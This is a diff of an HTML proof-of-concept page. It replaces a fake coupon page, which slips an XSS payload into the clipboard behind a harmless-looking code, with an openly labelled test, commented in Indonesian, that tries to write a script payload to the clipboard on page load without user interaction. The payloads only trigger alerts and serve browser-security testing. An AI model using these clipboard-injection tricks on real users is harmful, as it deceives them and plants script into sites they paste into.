@@ -1,66 +1,28 @@
-<!doctype html>
-<html lang="en">
+<!DOCTYPE html>
+<html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <title>Super Sale - Limited Coupons</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: linear-gradient(120deg, #f6d365 0%, #fda085 100%);
-      text-align: center;
-      padding: 50px;
-    }
-    .card {
-      background: #fff;
-      border-radius: 12px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-      display: inline-block;
-      padding: 40px;
-      max-width: 400px;
-    }
-    h1 {
-      margin-bottom: 10px;
-      color: #e74c3c;
-    }
-    p {
-      margin-bottom: 20px;
-      font-size: 16px;
-      color: #444;
-    }
-    button {
-      background: #e74c3c;
-      color: white;
-      border: none;
-      padding: 12px 24px;
-      border-radius: 6px;
-      cursor: pointer;
-      font-size: 16px;
-    }
-    button:hover {
-      background: #c0392b;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <title>PoC: Attack Site - Silent Clipboard Write</title>
 </head>
 <body>
-  <div class="card">
-    <h1>🔥 Mega Sale Coupon</h1>
-    <p>Click the button to copy your exclusive coupon code and save big at checkout!</p>
-    <button id="copy">Copy Coupon</button>
-  </div>
+    <h2>Menguji Celah Browser: Silent Clipboard Write</h2>
+    <p>Memeriksa apakah browser mengizinkan penulisan clipboard tanpa interaksi pengguna...</p>
 
-  <script>
-    const htmlPayload = `<img src=x onerror="alert('XSS via paste')">`;
-    document.getElementById('copy').addEventListener('click', () => {
-      const onCopy = e => {
-        e.clipboardData.setData('text/html', htmlPayload);
-        e.clipboardData.setData('text/plain', 'SALE2025');
-        e.preventDefault();
-        document.removeEventListener('copy', onCopy);
-      };
-      document.addEventListener('copy', onCopy);
-      document.execCommand('copy');
-      alert('Coupon copied! Paste it into the store checkout box.');
-    });
-  </script>
+    <script>
+        // Memicu fungsi secara otomatis saat halaman selesai dimuat
+        window.onload = async () => {
+            const payload = '<script>alert("UXSS: Sukses mengeksploitasi clipboard!")<\/script>';
+            
+            try {
+                // Mencoba menulis ke clipboard tanpa adanya event klik/keyboard dari user
+                await navigator.clipboard.writeText(payload);
+                console.log("[DITEMUKAN BUG] Berhasil menulis ke clipboard tanpa interaksi!");
+                alert("BUG FOUND: Sukses menulis payload ke clipboard tanpa klik!");
+            } catch (err) {
+                // Di browser normal, jalurnya akan berakhir di sini (Error: Document is not focused / User activation required)
+                console.log("[BLOCKED] Browser aman. Gagal menulis tanpa interaksi: ", err);
+            }
+        };
+    </script>
 </body>
 </html>
